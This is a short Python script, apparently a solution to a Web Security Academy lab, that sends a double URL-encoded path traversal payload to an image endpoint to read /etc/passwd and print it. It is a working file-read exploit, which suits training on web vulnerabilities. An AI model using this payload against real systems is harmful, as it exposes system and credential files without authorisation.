import requests

s = requests.Session()

site = 'acb01ff61e6595c3c0270e1e002a0059.web-security-academy.net'

url = f'''https://{site}/image?filename=..%252f..%252f..%252fetc/passwd'''
resp = s.get(url)
print(resp.text)